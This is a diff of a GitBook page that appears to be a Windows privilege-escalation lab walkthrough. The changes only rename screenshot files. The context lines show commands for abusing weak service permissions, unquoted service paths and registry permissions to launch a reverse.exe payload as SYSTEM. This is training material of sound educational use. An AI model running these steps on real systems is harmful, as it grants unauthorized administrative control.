@@ -28,7 +28,7 @@ Use accesschk.exe to check the "user" account's permissions on the "daclsvc" ser
 
 `C:\PrivEsc\accesschk.exe /accepteula -uwcqve user daclsvc`
 
-<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
 
 It shows the "user" account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG).
 
@@ -36,11 +36,11 @@ Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_
 
 `sc qc daclsvc`
 
-<figure><img src=".gitbook/assets/image (12) (1) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>
 
 Checking if the service is running or stopped currently `sc query daclsvc`&#x20;
 
-<figure><img src=".gitbook/assets/image (13) (1) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>
 
 We can modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable:
 
@@ -50,7 +50,7 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 `net start daclsvc`
 
-<figure><img src=".gitbook/assets/image (14) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (14) (1) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>
 
 ### 2 - Unquoted Service Paths
 
@@ -58,13 +58,13 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 Using `winPEASany.exe quite servicesinfo` - we see an "unquotedsvc" service, lets take a look at it with `sc qc unquotedsvc`&#x20;
 
-<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption><p>1</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (15) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
 
 #### A - Let's check if we have "read/write" access to the path.
 
 `.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"` - we have "RW" access, meaning we can replace the default service exe with our custom rev shell exe.
 
-<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption><p>2</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>
 
 #### B - Lets check if we have permission to start and stop the  service.
 
@@ -78,11 +78,11 @@ Copy the reverse.exe payload to the file path.
 
 `copy reverse.exe "C:\Program Files\Unquoted Path Service\common.exe"` - copy and replace it with "common.exe"
 
-<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption><p>3</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (17) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>
 
 Start nc listener and start the service -> `net start unquotedsvc` .
 
-<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption><p>4</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (18) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>
 
 ### 3 - Service Exploits - Weak Registry Permissions
 
@@ -92,7 +92,7 @@ The Windows registry stores entries for each service. Since registry entries can
 
 Run "winPEASany.exe" and check the reqistry session.
 
-<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption><p>1</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (19) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption><p>2</p></figcaption></figure>
 
